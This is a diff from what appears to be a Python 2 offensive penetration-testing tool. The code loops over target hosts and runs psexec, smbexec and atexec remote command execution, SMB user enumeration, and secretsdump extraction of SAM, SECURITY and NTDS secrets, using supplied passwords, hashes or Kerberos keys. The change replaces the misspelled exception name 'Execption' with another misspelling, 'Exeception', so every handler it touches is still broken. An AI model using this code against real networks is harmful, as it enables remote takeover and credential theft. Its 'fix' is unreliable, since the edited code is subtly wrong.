@@ -621,7 +621,7 @@ Create Pasteable Double Encoded Script:
             try:
                 attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
                 attack.run(dst)
-            except Execption, e:
+            except Exeception, e:
                 print("[!] An error occured during execution: %s") % (e)
             if attacks:
                 srv.terminate()
@@ -677,12 +677,12 @@ Create Pasteable Double Encoded Script:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
             try:
                 opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
-            except Execption, e:
+            except Exeception, e:
                 print("[!] An error occured during execution: %s") % (e)
             try:
                 attack = netview.USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
                 attack.run()
-            except Execption, e:
+            except Exeception, e:
                 print("[!] An error occured during execution: %s") % (e)
     elif smbexec_cmd:
         for dst in final_targets:
@@ -696,7 +696,7 @@ Create Pasteable Double Encoded Script:
             try:
                 attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
                 attack.run(dst)
-            except Execption, e:
+            except Exeception, e:
                 print("[!] An error occured during execution: %s") % (e)
             if attacks:
                 srv.terminate()
@@ -715,7 +715,7 @@ Create Pasteable Double Encoded Script:
             try:
                 attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
                 attack.play(dst)
-            except Execption, e:
+            except Exeception, e:
                 print("[!] An error occured during execution: %s") % (e)
             if attacks and not encoder:
                 srv = http_server(src_port, cwd)
@@ -743,7 +743,7 @@ Create Pasteable Double Encoded Script:
             try:
                 attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
                 attack.dump()
-            except Execption, e:
+            except Exeception, e:
                 print("[!] An error occured during execution: %s") % (e)
     else:
         print(instructions)
